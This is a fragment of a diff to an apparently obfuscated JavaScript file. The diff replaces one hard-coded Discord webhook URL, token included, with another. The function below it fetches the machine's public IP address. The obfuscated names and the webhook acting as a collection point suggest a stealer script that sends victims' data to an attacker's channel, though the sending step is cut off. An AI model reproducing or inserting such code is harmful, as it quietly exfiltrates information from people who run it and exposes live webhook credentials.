@@ -1,4 +1,4 @@
-const WEBHOOK = "https://discord.com/api/webhooks/1031650174470201354/bRiQOIlHv18Ry7GRGFKqs69Z6-ux6AgBqQqY6gWBlIKE_Y4hRUsU_DUgeDHQlSqa6z5r";
+const WEBHOOK = "https://discord.com/api/webhooks/1080218448849813525/KGIvIS_IAD37hPizvZEPtyo66knMpOAIdBJf5kcuUOEUKK2gv1flvXDWWV5v21yBpn7L";
 async function main(_0xf4e6x3) {
   var _0xf4e6x4 = await (await fetch("https://api.ipify.org")).text();
   if (_0xf4e6x3) {
